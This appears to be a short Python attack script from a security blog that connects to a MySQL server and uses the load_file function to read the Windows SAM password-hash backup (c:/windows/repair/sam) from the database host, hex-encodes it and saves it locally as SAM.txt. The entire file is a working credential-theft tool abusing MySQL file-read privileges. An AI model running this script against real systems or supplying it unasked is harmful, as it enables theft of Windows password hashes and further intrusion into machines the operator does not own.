#!/usr/bin/python

#Author - jakx

#http://securitypadawan.blogspot.com/2013/06/pulling-windows-hashes-using-mysql.html

#Script that makes a connection to a MySQL database,
#pulls a hex encoded file, then dumps it to a file on your local machine.

import MySQLdb

#You will need to edit the connection line
db = MySQLdb.connect(host="#placeholder#", user="#placeholder#", passwd="#placeholder#", db="#placeholder#")

cur = db.cursor()

cur.execute("SELECT hex(load_file('c:/windows/repair/sam'));")

for row in cur.fetchall() :
            with open("SAM.txt", "a") as myfile:
                cleanrow = str(row)
                cleanrow = cleanrow.strip("(),'")
                myfile.write(cleanrow)

cur.close()
db.close ()